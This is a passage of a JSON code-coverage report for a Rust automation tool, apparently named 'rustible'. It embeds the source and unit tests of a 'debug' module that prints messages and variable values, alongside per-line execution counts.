line":189,"address":[29055993],"length":1,"stats":{"Line":0}},{"line":192,"address":[29052863],"length":1,"stats":{"Line":0}},{"line":195,"address":[29053185],"length":1,"stats":{"Line":0}},{"line":196,"address":[29056162],"length":1,"stats":{"Line":0}},{"line":197,"address":[29057271],"length":1,"stats":{"Line":0}},{"line":199,"address":[29057208,29056493],"length":1,"stats":{"Line":0}},{"line":204,"address":[29056448,29056541],"length":1,"stats":{"Line":0}},{"line":205,"address":[25969952],"length":1,"stats":{"Line":0}},{"line":206,"address":[29067814,29067874],"length":1,"stats":{"Line":0}},{"line":209,"address":[29058113],"length":1,"stats":{"Line":0}},{"line":211,"address":[29058004],"length":1,"stats":{"Line":0}},{"line":215,"address":[29056259],"length":1,"stats":{"Line":0}},{"line":217,"address":[29056196,29056124],"length":1,"stats":{"Line":0}},{"line":222,"address":[29052798],"length":1,"stats":{"Line":0}},{"line":223,"address":[29053628,29053555,29053231],"length":1,"stats":{"Line":0}},{"line":224,"address":[29053601],"length":1,"stats":{"Line":0}},{"line":225,"address":[29053569,29053638,29053684,29053711],"length":1,"stats":{"Line":0}},{"line":226,"address":[29053668],"length":1,"stats":{"Line":0}},{"line":228,"address":[29053686],"length":1,"stats":{"Line":0}},{"line":231,"address":[29053786,29053751],"length":1,"stats":{"Line":0}},{"line":232,"address":[29054408,29053796,29053880,29054919],"length":1,"stats":{"Line":0}},{"line":233,"address":[29054013,29053926],"length":1,"stats":{"Line":0}},{"line":234,"address":[29054147,29054058],"length":1,"stats":{"Line":0}},{"line":236,"address":[29054093,29054372],"length":1,"stats":{"Line":0}},{"line":238,"address":[29054374,29054317],"length":1,"stats":{"Line":0}},{"line":240,"address":[29054885,29054838],"length":1,"stats":{"Line":0}},{"line":241,"address":[29053972,29054464],"length":1,"stats":{"Line":0}},{"line":242,"address":[29054670,29054738],"length":1,"stats":{"Line":0}},{"line":246,"address":[29053760],"length":1,"stats":{"Line":0}},{"line":249,"address":[29055069],"length":1,"stats":{"Line":0}},{"line":252,"address":[29053839,29055006],"length":1,"stats":{"Line":0}},{"line":255,"address":[29055564,29055278],"length":1,"stats":{"Line":0}},{"line":256,"address":[29055443,29055538],"length":1,"stats":{"Line":0}},{"line":259,"address":[29055476],"length":1,"stats":{"Line":0}},{"line":263,"address":[25969974],"length":1,"stats":{"Line":0}},{"line":264,"address":[29058580],"length":1,"stats":{"Line":0}},{"line":265,"address":[29058904,29059038],"length":1,"stats":{"Line":0}},{"line":268,"address":[25969996],"length":1,"stats":{"Line":0}},{"line":269,"address":[29059815],"length":1,"stats":{"Line":0}},{"line":270,"address":[29060067,29060795,29059843,29060162,29060871,29060710],"length":1,"stats":{"Line":0}},{"line":271,"address":[29059961,29060079],"length":1,"stats":{"Line":0}},{"line":272,"address":[29060184,29047067,29060742,29060115,29060552],"length":1,"stats":{"Line":0}},{"line":273,"address":[29067536,29060772,29067771],"length":1,"stats":{"Line":0}},{"line":274,"address":[29067618,29067558],"length":1,"stats":{"Line":0}},{"line":277,"address":[29059743],"length":1,"stats":{"Line":0}},{"line":278,"address":[29059781,29060249],"length":1,"stats":{"Line":0}},{"line":287,"address":[29053267],"length":1,"stats":{"Line":0}},{"line":288,"address":[29061009,29061277],"length":1,"stats":{"Line":0}},{"line":289,"address":[29061051,29061244],"length":1,"stats":{"Line":0}},{"line":291,"address":[29061498,29061153,29061290],"length":1,"stats":{"Line":0}},{"line":292,"address":[29061465,29061320],"length":1,"stats":{"Line":0}},{"line":294,"address":[29061422,29061775,29061508],"length":1,"stats":{"Line":0}},{"line":295,"address":[29061538,29061742],"length":1,"stats":{"Line":0}},{"line":297,"address":[29061788,29061640],"length":1,"stats":{"Line":0}},{"line":300,"address":[29061829],"length":1,"stats":{"Line":0}},{"line":302,"address":[29062415,29061913,29063435,29063520,29063596,29063724,29062320],"length":1,"stats":{"Line":0}},{"line":303,"address":[29062035,29062332],"length":1,"stats":{"Line":0}},{"line":304,"address":[25970040],"length":1,"stats":{"Line":0}},{"line":305,"address":[29063497,29067280,29067515],"length":1,"stats":{"Line":0}},{"line":306,"address":[29067302,29067362],"length":1,"stats":{"Line":0}},{"line":308,"address":[29063634],"length":1,"stats":{"Line":0}},{"line":309,"address":[29062470,29061948],"length":1,"stats":{"Line":0}},{"line":311,"address":[29062597,29062498],"length":1,"stats":{"Line":0}},{"line":312,"address":[29063019,29062924,29063895,29063980,29062635,29064056,29064756],"length":1,"stats":{"Line":0}},{"line":313,"address":[29062936,29062702],"length":1,"stats":{"Line":0}},{"line":314,"address":[25970062],"length":1,"stats":{"Line":0}},{"line":315,"address":[29068048,29068283,29063957],"length":1,"stats":{"Line":0}},{"line":316,"address":[29068070,29068130],"length":1,"stats":{"Line":0}},{"line":318,"address":[29064097],"length":1,"stats":{"Line":0}},{"line":320,"address":[29063066],"length":1,"stats":{"Line":0}},{"line":321,"address":[29062539],"length":1,"stats":{"Line":0}},{"line":326,"address":[29063674,29064271],"length":1,"stats":{"Line":0}},{"line":329,"address":[29063691,29064208],"length":1,"stats":{"Line":0}},{"line":333,"address":[29065016,29064502,29065351,29064605,29047130],"length":1,"stats":{"Line":0}},{"line":334,"address":[29066166,29066496,29066563,29065803,29065399,29066331,29065638],"length":1,"stats":{"Line":0}},{"line":335,"address":[29065563,29065451,29066897,29065646],"length":1,"stats":{"Line":0}},{"line":336,"address":[29065721,29065728,29066845,29066890,29066930,29065811],"length":1,"stats":{"Line":0}},{"line":337,"address":[29066174],"length":1,"stats":{"Line":0}},{"line":339,"address":[29065964,29065870,29066132],"length":1,"stats":{"Line":0}},{"line":341,"address":[29066861,29066339,29066256,29066824,29066766,29066946,29066233],"length":1,"stats":{"Line":0}},{"line":342,"address":[29066832,29066398,29066721,29066869,29066954,29066421,29066504,29066599],"length":1,"stats":{"Line":0}},{"line":345,"address":[29066990],"length":1,"stats":{"Line":0}},{"line":350,"address":[26504584,26503616,26504578],"length":1,"stats":{"Line":0}},{"line":365,"address":[26504282,26504082],"length":1,"stats":{"Line":0}},{"line":366,"address":[26504322,26504503],"length":1,"stats":{"Line":0}},{"line":367,"address":[26504298],"length":1,"stats":{"Line":0}},{"line":382,"address":[26492953,26492048,26492959],"length":1,"stats":{"Line":1}},{"line":393,"address":[26492394],"length":1,"stats":{"Line":1}},{"line":396,"address":[26492520,26492868],"length":1,"stats":{"Line":2}},{"line":397,"address":[26492583,26492712],"length":1,"stats":{"Line":1}},{"line":398,"address":[26492672,26493729,26492972],"length":1,"stats":{"Line":3}},{"line":399,"address":[26493004],"length":1,"stats":{"Line":1}},{"line":400,"address":[26493048],"length":1,"stats":{"Line":1}},{"line":401,"address":[26493232],"length":1,"stats":{"Line":0}},{"line":406,"address":[26493521,26493589],"length":1,"stats":{"Line":1}},{"line":408,"address":[26493100],"length":1,"stats":{"Line":0}},{"line":409,"address":[26493066],"length":1,"stats":{"Line":0}},{"line":414,"address":[26493785,26492932],"length":1,"stats":{"Line":2}},{"line":415,"address":[26493901,26493826],"length":1,"stats":{"Line":0}},{"line":416,"address":[26493933,26494010],"length":1,"stats":{"Line":0}},{"line":417,"address":[26494184,26503444,26494026],"length":1,"stats":{"Line":0}},{"line":418,"address":[29046367],"length":1,"stats":{"Line":0}},{"line":419,"address":[29046334],"length":1,"stats":{"Line":0}},{"line":423,"address":[26503454],"length":1,"stats":{"Line":0}},{"line":424,"address":[26493960],"length":1,"stats":{"Line":0}},{"line":428,"address":[26493859,26493807],"length":1,"stats":{"Line":2}},{"line":432,"address":[26493861,26494281],"length":1,"stats":{"Line":2}},{"line":433,"address":[26494434,26494313],"length":1,"stats":{"Line":2}},{"line":434,"address":[26494480,26494682],"length":1,"stats":{"Line":1}},{"line":437,"address":[26494757,26494722,26494348],"length":1,"stats":{"Line":3}},{"line":438,"address":[26494767],"length":1,"stats":{"Line":1}},{"line":439,"address":[26494790,26494841,26503379,26503420],"length":1,"stats":{"Line":2}},{"line":440,"address":[26495197],"length":1,"stats":{"Line":1}},{"line":442,"address":[26494749],"length":1,"stats":{"Line":1}},{"line":446,"address":[26494663],"length":1,"stats":{"Line":1}},{"line":448,"address":[26495389,26495486,26495426],"length":1,"stats":{"Line":2}},{"line":449,"address":[26495877,26495504,26495455,26495539],"length":1,"stats":{"Line":0}},{"line":450,"address":[26495587,26495882,26495541],"length":1,"stats":{"Line":0}},{"line":451,"address":[26495863],"length":1,"stats":{"Line":0}},{"line":453,"address":[26495531],"length":1,"stats":{"Line":0}},{"line":456,"address":[26495478],"length":1,"stats":{"Line":1}},{"line":459,"address":[26495568],"length":1,"stats":{"Line":1}},{"line":460,"address":[26495925],"length":1,"stats":{"Line":0}},{"line":461,"address":[26496823],"length":1,"stats":{"Line":0}},{"line":463,"address":[26496760,26496237],"length":1,"stats":{"Line":0}},{"line":466,"address":[26496739,26496206,26496279],"length":1,"stats":{"Line":0}},{"line":467,"address":[26496558],"length":1,"stats":{"Line":0}},{"line":469,"address":[26496456],"length":1,"stats":{"Line":0}},{"line":473,"address":[26496017],"length":1,"stats":{"Line":1}},{"line":475,"address":[26495895,26495954],"length":1,"stats":{"Line":2}},{"line":480,"address":[26495413],"length":1,"stats":{"Line":1}},{"line":481,"address":[26497024,26501802],"length":1,"stats":{"Line":2}},{"line":482,"address":[26502701,26501879,26502221,26501804],"length":1,"stats":{"Line":0}},{"line":483,"address":[26501895,26501950],"length":1,"stats":{"Line":0}},{"line":484,"address":[26502094,26502002],"length":1,"stats":{"Line":0}},{"line":486,"address":[26502009,26501979],"length":1,"stats":{"Line":0}},{"line":488,"address":[26502103,26502226,26502011],"length":1,"stats":{"Line":0}},{"line":490,"address":[26502667,26502620],"length":1,"stats":{"Line":0}},{"line":491,"address":[26501920,26502258],"length":1,"stats":{"Line":0}},{"line":492,"address":[26502520,26502452],"length":1,"stats":{"Line":0}},{"line":496,"address":[26501776],"length":1,"stats":{"Line":1}},{"line":499,"address":[26502833],"length":1,"stats":{"Line":1}},{"line":502,"address":[26502782,26501851],"length":1,"stats":{"Line":2}},{"line":505,"address":[26503042,26503323],"length":1,"stats":{"Line":1}},{"line":506,"address":[26503203,26503297],"length":1,"stats":{"Line":0}},{"line":509,"address":[26503232],"length":1,"stats":{"Line":1}},{"line":513,"address":[26497011,26497063,26497406],"length":1,"stats":{"Line":3}},{"line":514,"address":[26497170,26501774,26497073],"length":1,"stats":{"Line":2}},{"line":516,"address":[26497037],"length":1,"stats":{"Line":1}},{"line":520,"address":[26497493,26497104],"length":1,"stats":{"Line":2}},{"line":521,"address":[26497631,26497698],"length":1,"stats":{"Line":2}},{"line":522,"address":[26497720],"length":1,"stats":{"Line":0}},{"line":527,"address":[26497645,26497911],"length":1,"stats":{"Line":2}},{"line":528,"address":[26498022,26498248,26497919],"length":1,"stats":{"Line":2}},{"line":529,"address":[26497942,26498253],"length":1,"stats":{"Line":2}},{"line":530,"address":[26498285],"length":1,"stats":{"Line":1}},{"line":531,"address":[26498374],"length":1,"stats":{"Line":1}},{"line":535,"address":[26498606,26501691,26498222],"length":1,"stats":{"Line":2}},{"line":537,"address":[26498892],"length":1,"stats":{"Line":1}},{"line":540,"address":[26498790],"length":1,"stats":{"Line":1}},{"line":543,"address":[26499109],"length":1,"stats":{"Line":1}},{"line":544,"address":[26499541,26499186,26499279],"length":1,"stats":{"Line":1}},{"line":547,"address":[26499266,26499717],"length":1,"stats":{"Line":2}},{"line":548,"address":[26499578],"length":1,"stats":{"Line":1}},{"line":552,"address":[26499722,26499548],"length":1,"stats":{"Line":2}},{"line":553,"address":[26500973,26499914,26501227,26500153,26501168,26500357,26500778],"length":1,"stats":{"Line":7}},{"line":554,"address":[26500078,26500161,26501635,26499961],"length":1,"stats":{"Line":2}},{"line":555,"address":[26500365,26500228,26500243,26501617],"length":1,"stats":{"Line":2}},{"line":556,"address":[26500786],"length":1,"stats":{"Line":1}},{"line":558,"address":[26500432,26500744,26500493],"length":1,"stats":{"Line":3}},{"line":560,"address":[26501587,26500853,26500864,26500981],"length":1,"stats":{"Line":2}},{"line":561,"address":[26501176,26501059,26501048,26501542,26501265],"length":1,"stats":{"Line":3}},{"line":563,"address":[26501347],"length":1,"stats":{"Line":1}},{"line":568,"address":[26485728],"length":1,"stats":{"Line":0}},{"line":572,"address":[26480912],"length":1,"stats":{"Line":0}},{"line":576,"address":[26480944],"length":1,"stats":{"Line":0}},{"line":580,"address":[26480960],"length":1,"stats":{"Line":0}},{"line":582,"address":[26481006,26481101],"length":1,"stats":{"Line":0}},{"line":583,"address":[26481169],"length":1,"stats":{"Line":0}},{"line":584,"address":[26481141],"length":1,"stats":{"Line":0}},{"line":589,"address":[26481049],"length":1,"stats":{"Line":0}},{"line":590,"address":[26481277],"length":1,"stats":{"Line":0}},{"line":593,"address":[26481259],"length":1,"stats":{"Line":0}},{"line":596,"address":[26489715,26486192,26489107],"length":1,"stats":{"Line":1}},{"line":601,"address":[26486276],"length":1,"stats":{"Line":1}},{"line":602,"address":[26486536,26486623,26489713],"length":1,"stats":{"Line":2}},{"line":603,"address":[26489695,26486891,26486804],"length":1,"stats":{"Line":2}},{"line":604,"address":[26487162,26487072],"length":1,"stats":{"Line":2}},{"line":605,"address":[26487171],"length":1,"stats":{"Line":1}},{"line":606,"address":[26489674,26487350,26487266],"length":1,"stats":{"Line":1}},{"line":608,"address":[26487407],"length":1,"stats":{"Line":3}},{"line":609,"address":[26487532,26489653,26487445],"length":1,"stats":{"Line":2}},{"line":610,"address":[26489651,26487691],"length":1,"stats":{"Line":1}},{"line":611,"address":[26488002,26487915],"length":1,"stats":{"Line":2}},{"line":614,"address":[26488215],"length":1,"stats":{"Line":1}},{"line":617,"address":[26488268,26488385],"length":1,"stats":{"Line":0}},{"line":618,"address":[26488417],"length":1,"stats":{"Line":0}},{"line":619,"address":[26488513],"length":1,"stats":{"Line":0}},{"line":620,"address":[26488580],"length":1,"stats":{"Line":0}},{"line":622,"address":[26488647],"length":1,"stats":{"Line":0}},{"line":623,"address":[26488714],"length":1,"stats":{"Line":0}},{"line":625,"address":[26488789],"length":1,"stats":{"Line":0}},{"line":626,"address":[26488899],"length":1,"stats":{"Line":0}},{"line":627,"address":[26488906],"length":1,"stats":{"Line":0}},{"line":632,"address":[26488299],"length":1,"stats":{"Line":1}},{"line":633,"address":[26489145],"length":1,"stats":{"Line":1}},{"line":634,"address":[26489212],"length":1,"stats":{"Line":1}},{"line":638,"address":[26489284],"length":1,"stats":{"Line":1}},{"line":639,"address":[26489407],"length":1,"stats":{"Line":1}},{"line":640,"address":[26489415],"length":1,"stats":{"Line":1}},{"line":645,"address":[26485760,26486160,26486166],"length":1,"stats":{"Line":1}},{"line":650,"address":[26486096],"length":1,"stats":{"Line":1}},{"line":653,"address":[26481424,26485709,26482879],"length":1,"stats":{"Line":0}},{"line":654,"address":[26481498],"length":1,"stats":{"Line":0}},{"line":655,"address":[26481798,26481901],"length":1,"stats":{"Line":0}},{"line":656,"address":[26485704,26481939],"length":1,"stats":{"Line":0}},{"line":659,"address":[26482203],"length":1,"stats":{"Line":0}},{"line":661,"address":[26482260,26482410],"length":1,"stats":{"Line":0}},{"line":663,"address":[26482426],"length":1,"stats":{"Line":0}},{"line":664,"address":[26482536],"length":1,"stats":{"Line":0}},{"line":665,"address":[29045356,29045287,29045484,29045240],"length":1,"stats":{"Line":0}},{"line":666,"address":[29045733],"length":1,"stats":{"Line":0}},{"line":667,"address":[29046055,29045723],"length":1,"stats":{"Line":0}},{"line":670,"address":[26482685],"length":1,"stats":{"Line":0}},{"line":673,"address":[26482923,26484001,26482614],"length":1,"stats":{"Line":0}},{"line":674,"address":[26483136],"length":1,"stats":{"Line":0}},{"line":675,"address":[26483213,26483345],"length":1,"stats":{"Line":0}},{"line":676,"address":[26483377],"length":1,"stats":{"Line":0}},{"line":677,"address":[26483430],"length":1,"stats":{"Line":0}},{"line":678,"address":[29046160,29046176],"length":1,"stats":{"Line":0}},{"line":679,"address":[26483574],"length":1,"stats":{"Line":0}},{"line":680,"address":[29044492,29044248,29044364,29044295],"length":1,"stats":{"Line":0}},{"line":681,"address":[29044741],"length":1,"stats":{"Line":0}},{"line":682,"address":[29045063,29044731],"length":1,"stats":{"Line":0}},{"line":685,"address":[26483685],"length":1,"stats":{"Line":0}},{"line":689,"address":[26483250],"length":1,"stats":{"Line":0}},{"line":693,"address":[26484046,26482288],"length":1,"stats":{"Line":0}},{"line":694,"address":[26484188,26484094],"length":1,"stats":{"Line":0}},{"line":695,"address":[26484225,26484365],"length":1,"stats":{"Line":0}},{"line":697,"address":[26484202,26484244],"length":1,"stats":{"Line":0}},{"line":699,"address":[26484246,26484374],"length":1,"stats":{"Line":0}},{"line":702,"address":[26484477,26484113,26485666],"length":1,"stats":{"Line":0}},{"line":703,"address":[26484690],"length":1,"stats":{"Line":0}},{"line":704,"address":[26484767,26484929],"length":1,"stats":{"Line":0}},{"line":705,"address":[26484961],"length":1,"stats":{"Line":0}},{"line":706,"address":[26485099,26485014],"length":1,"stats":{"Line":0}},{"line":708,"address":[26485153,26485209],"length":1,"stats":{"Line":0}},{"line":709,"address":[26485246,26485370],"length":1,"stats":{"Line":0}},{"line":711,"address":[26485265,26485223],"length":1,"stats":{"Line":0}},{"line":713,"address":[26485413,26485267],"length":1,"stats":{"Line":0}},{"line":717,"address":[26484804],"length":1,"stats":{"Line":0}}],"covered":113,"coverable":333},{"path":["/","home","artur","Repositories","rustible","src","modules","debug.rs"],"content":"//! Debug module - Print debug messages and variable values\n//!\n//! This module is used for debugging playbooks. It prints messages or variable\n//! values to the console. Unlike most modules, it runs entirely on the control\n//! node and does not require an SSH connection.\n\nuse super::{\n    Module, ModuleClassification, ModuleContext, ModuleError, ModuleOutput, ModuleParams,\n    ModuleResult, ParallelizationHint, ParamExt,\n};\nuse serde_json::Value;\nuse std::collections::HashMap;\n\n/// Module for printing debug messages and variable values\npub struct DebugModule;\n\nimpl DebugModule {\n    /// Format a variable value for display\n    fn format_value(\u0026self, value: \u0026Value) -\u003e String {\n        match value {\n            Value::String(s) =\u003e s.clone(),\n            Value::Null =\u003e \"(undefined)\".to_string(),\n            _ =\u003e serde_json::to_string_pretty(value).unwrap_or_else(|_| format!(\"{:?}\", value)),\n        }\n    }\n\n    /// Get the value of a variable from context\n    fn get_variable_value(\u0026self, var_name: \u0026str, context: \u0026ModuleContext) -\u003e Option\u003cValue\u003e {\n        // Try to parse as a JSON path or simple variable name\n        // First check vars, then facts\n        if let Some(value) = context.vars.get(var_name) {\n            return Some(value.clone());\n        }\n\n        if let Some(value) = context.facts.get(var_name) {\n            return Some(value.clone());\n        }\n\n        // Try to handle nested paths like \"ansible_facts.hostname\"\n        if var_name.contains('.') {\n            let parts: Vec\u003c\u0026str\u003e = var_name.split('.').collect();\n\n            // Try vars first\n            if let Some(root) = context.vars.get(parts[0]) {\n                let mut current = root;\n                for part in \u0026parts[1..] {\n                    if let Value::Object(obj) = current {\n                        if let Some(val) = obj.get(*part) {\n                            current = val;\n                        } else {\n                            return None;\n                        }\n                    } else {\n                        return None;\n                    }\n                }\n                return Some(current.clone());\n            }\n\n            // Try facts\n            if let Some(root) = context.facts.get(parts[0]) {\n                let mut current = root;\n                for part in \u0026parts[1..] {\n                    if let Value::Object(obj) = current {\n                        if let Some(val) = obj.get(*part) {\n                            current = val;\n                        } else {\n                            return None;\n                        }\n                    } else {\n                        return None;\n                    }\n                }\n                return Some(current.clone());\n            }\n        }\n\n        None\n    }\n\n    /// Check if the current verbosity level allows this message to be shown\n    fn should_show(\u0026self, params: \u0026ModuleParams, _context: \u0026ModuleContext) -\u003e ModuleResult\u003cbool\u003e {\n        // Get the verbosity parameter (default to 0)\n        let required_verbosity = params.get_i64(\"verbosity\")?.unwrap_or(0);\n\n        // TODO: In the future, we should get the actual verbosity level from context or environment\n        // For now, we'll always show messages (assume verbosity is sufficient)\n        // In a real implementation, you'd check against the -v/-vv/-vvv flags passed to rustible\n        let current_verbosity = std::env::var(\"RUSTIBLE_VERBOSITY\")\n            .ok()\n            .and_then(|v| v.parse::\u003ci64\u003e().ok())\n            .unwrap_or(0);\n\n        Ok(current_verbosity \u003e= required_verbosity)\n    }\n}\n\nimpl Module for DebugModule {\n    fn name(\u0026self) -\u003e \u0026'static str {\n        \"debug\"\n    }\n\n    fn description(\u0026self) -\u003e \u0026'static str {\n        \"Print debug messages or variable values to the console\"\n    }\n\n    fn classification(\u0026self) -\u003e ModuleClassification {\n        // LocalLogic because this runs entirely on the control node\n        ModuleClassification::LocalLogic\n    }\n\n    fn parallelization_hint(\u0026self) -\u003e ParallelizationHint {\n        // Can run in parallel since it's just printing\n        ParallelizationHint::FullyParallel\n    }\n\n    fn required_params(\u0026self) -\u003e \u0026[\u0026'static str] {\n        // Neither msg nor var is strictly required, but at least one should be provided\n        \u0026[]\n    }\n\n    fn validate_params(\u0026self, params: \u0026ModuleParams) -\u003e ModuleResult\u003c()\u003e {\n        // Must have either msg or var\n        if params.get(\"msg\").is_none() \u0026\u0026 params.get(\"var\").is_none() {\n            return Err(ModuleError::InvalidParameter(\n                \"Either 'msg' or 'var' must be provided\".to_string(),\n            ));\n        }\n\n        // Cannot have both msg and var\n        if params.get(\"msg\").is_some() \u0026\u0026 params.get(\"var\").is_some() {\n            return Err(ModuleError::InvalidParameter(\n                \"Cannot specify both 'msg' and 'var' parameters\".to_string(),\n            ));\n        }\n\n        Ok(())\n    }\n\n    fn execute(\n        \u0026self,\n        params: \u0026ModuleParams,\n        context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Check if we should show this message based on verbosity\n        if !self.should_show(params, context)? {\n            return Ok(ModuleOutput::skipped(\"Skipped due to verbosity level\"));\n        }\n\n        let mut output_data: HashMap\u003cString, Value\u003e = HashMap::new();\n        let message: String;\n\n        if let Some(msg) = params.get(\"msg\") {\n            // Print a message\n            message = match msg {\n                Value::String(s) =\u003e s.clone(),\n                _ =\u003e self.format_value(msg),\n            };\n\n            output_data.insert(\"msg\".to_string(), Value::String(message.clone()));\n        } else if let Some(var_param) = params.get(\"var\") {\n            // Print a variable value\n            let var_name = match var_param {\n                Value::String(s) =\u003e s,\n                _ =\u003e {\n                    return Err(ModuleError::InvalidParameter(\n                        \"'var' parameter must be a string\".to_string(),\n                    ))\n                }\n            };\n\n            match self.get_variable_value(var_name, context) {\n                Some(value) =\u003e {\n                    let formatted = self.format_value(\u0026value);\n                    message = format!(\"{}: {}\", var_name, formatted);\n                    output_data.insert(var_name.clone(), value);\n                }\n                None =\u003e {\n                    // Variable not found\n                    message = format!(\"{}: VARIABLE IS NOT DEFINED!\", var_name);\n                    output_data.insert(var_name.clone(), Value::Null);\n                }\n            }\n        } else {\n            // This shouldn't happen due to validate_params, but handle it anyway\n            return Err(ModuleError::InvalidParameter(\n                \"Either 'msg' or 'var' must be provided\".to_string(),\n            ));\n        }\n\n        // Debug module never changes anything - it's always \"ok\" status\n        let mut output = ModuleOutput::ok(message);\n        output.data = output_data;\n\n        Ok(output)\n    }\n\n    fn check(\u0026self, params: \u0026ModuleParams, context: \u0026ModuleContext) -\u003e ModuleResult\u003cModuleOutput\u003e {\n        // Debug module behaves the same in check mode\n        self.execute(params, context)\n    }\n\n    fn diff(\n        \u0026self,\n        _params: \u0026ModuleParams,\n        _context: \u0026ModuleContext,\n    ) -\u003e ModuleResult\u003cOption\u003csuper::Diff\u003e\u003e {\n        // Debug module never produces diffs\n        Ok(None)\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_debug_with_msg() {\n        let module = DebugModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"msg\".to_string(),\n            Value::String(\"Hello, World!\".to_string()),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert_eq!(result.msg, \"Hello, World!\");\n        assert!(result.data.contains_key(\"msg\"));\n    }\n\n    #[test]\n    fn test_debug_with_var() {\n        let module = DebugModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"var\".to_string(), Value::String(\"test_var\".to_string()));\n\n        let mut vars = HashMap::new();\n        vars.insert(\n            \"test_var\".to_string(),\n            Value::String(\"test value\".to_string()),\n        );\n        let context = ModuleContext::default().with_vars(vars);\n\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert!(result.msg.contains(\"test_var\"));\n        assert!(result.msg.contains(\"test value\"));\n        assert!(result.data.contains_key(\"test_var\"));\n    }\n\n    #[test]\n    fn test_debug_with_undefined_var() {\n        let module = DebugModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"var\".to_string(),\n            Value::String(\"undefined_var\".to_string()),\n        );\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert!(result.msg.contains(\"VARIABLE IS NOT DEFINED\"));\n        assert!(result.data.contains_key(\"undefined_var\"));\n        assert_eq!(result.data.get(\"undefined_var\"), Some(\u0026Value::Null));\n    }\n\n    #[test]\n    fn test_debug_with_nested_var() {\n        let module = DebugModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"var\".to_string(),\n            Value::String(\"ansible_facts.hostname\".to_string()),\n        );\n\n        let mut vars = HashMap::new();\n        let mut ansible_facts = serde_json::Map::new();\n        ansible_facts.insert(\n            \"hostname\".to_string(),\n            Value::String(\"testhost\".to_string()),\n        );\n        vars.insert(\"ansible_facts\".to_string(), Value::Object(ansible_facts));\n\n        let context = ModuleContext::default().with_vars(vars);\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert!(result.msg.contains(\"ansible_facts.hostname\"));\n        assert!(result.msg.contains(\"testhost\"));\n    }\n\n    #[test]\n    fn test_debug_with_verbosity() {\n        let module = DebugModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\n            \"msg\".to_string(),\n            Value::String(\"Debug message\".to_string()),\n        );\n        params.insert(\"verbosity\".to_string(), Value::Number(2.into()));\n\n        let context = ModuleContext::default();\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        // Without setting RUSTIBLE_VERBOSITY, this should be skipped\n        // But since we're assuming verbosity is sufficient for now, it will show\n        assert!(!result.changed);\n    }\n\n    #[test]\n    fn test_debug_validation_requires_msg_or_var() {\n        let module = DebugModule;\n        let params: ModuleParams = HashMap::new();\n\n        let result = module.validate_params(\u0026params);\n        assert!(result.is_err());\n        assert!(result\n            .unwrap_err()\n            .to_string()\n            .contains(\"Either 'msg' or 'var'\"));\n    }\n\n    #[test]\n    fn test_debug_validation_not_both() {\n        let module = DebugModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"msg\".to_string(), Value::String(\"Hello\".to_string()));\n        params.insert(\"var\".to_string(), Value::String(\"test\".to_string()));\n\n        let result = module.validate_params(\u0026params);\n        assert!(result.is_err());\n        assert!(result\n            .unwrap_err()\n            .to_string()\n            .contains(\"Cannot specify both\"));\n    }\n\n    #[test]\n    fn test_debug_check_mode_same_as_execute() {\n        let module = DebugModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"msg\".to_string(), Value::String(\"Test\".to_string()));\n\n        let context = ModuleContext::default().with_check_mode(true);\n        let result = module.check(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert_eq!(result.msg, \"Test\");\n    }\n\n    #[test]\n    fn test_debug_with_complex_object() {\n        let module = DebugModule;\n        let mut params: ModuleParams = HashMap::new();\n        params.insert(\"var\".to_string(), Value::String(\"complex_var\".to_string()));\n\n        let mut vars = HashMap::new();\n        let complex_value = serde_json::json!({\n            \"key1\": \"value1\",\n            \"key2\": 42,\n            \"nested\": {\n                \"inner\": true\n            }\n        });\n        vars.insert(\"complex_var\".to_string(), complex_value);\n\n        let context = ModuleContext::default().with_vars(vars);\n        let result = module.execute(\u0026params, \u0026context).unwrap();\n\n        assert!(!result.changed);\n        assert!(result.msg.contains(\"complex_var\"));\n        assert!(result.data.contains_key(\"complex_var\"));\n    }\n}\n","traces":[{"line":19,"address":[31269856],"length":1,"stats":{"Line":1}},{"line":20,"address":[31269879],"length":1,"stats":{"Line":1}},{"line":21,"address":[31269984],"length":1,"stats":{"Line":1}},{"line":22,"address":[31269960],"length":1,"stats":{"Line":0}},{"line":23,"address":[26475885,26475856],"length":1,"stats":{"Line":1}},{"line":28,"address":[31271864,31271870,31270016],"length":1,"stats":{"Line":1}},{"line":31,"address":[31270128],"length":1,"stats":{"Line":1}},{"line":32,"address":[31270193],"length":1,"stats":{"Line":1}},{"line":35,"address":[31270354,31270287],"length":1,"stats":{"Line":1}},{"line":36,"address":[31270370],"length":1,"stats":{"Line":0}},{"line":40,"address":[31270456],"length":1,"stats":{"Line":1}},{"line":41,"address":[31270503],"length":1,"stats":{"Line":1}},{"line":44,"address":[31270684,31270582],"length":1,"stats":{"Line":2}},{"line":45,"address":[31270773],"length":1,"stats":{"Line":1}},{"line":46,"address":[31271273,31270781,31270889],"length":1,"stats":{"Line":3}},{"line":47,"address":[31271149,31271025],"length":1,"stats":{"Line":2}},{"line":48,"address":[31271210,31271169],"length":1,"stats":{"Line":2}},{"line":49,"address":[31271265],"length":1,"stats":{"Line":1}},{"line":51,"address":[31271286],"length":1,"stats":{"Line":0}},{"line":54,"address":[31271200],"length":1,"stats":{"Line":0}},{"line":57,"address":[31271047],"length":1,"stats":{"Line":1}},{"line":61,"address":[31270829,31271304],"length":1,"stats":{"Line":0}},{"line":62,"address":[31271387],"length":1,"stats":{"Line":0}},{"line":63,"address":[31271843,31271395,31271461],"length":1,"stats":{"Line":0}},{"line":64,"address":[31271721,31271597],"length":1,"stats":{"Line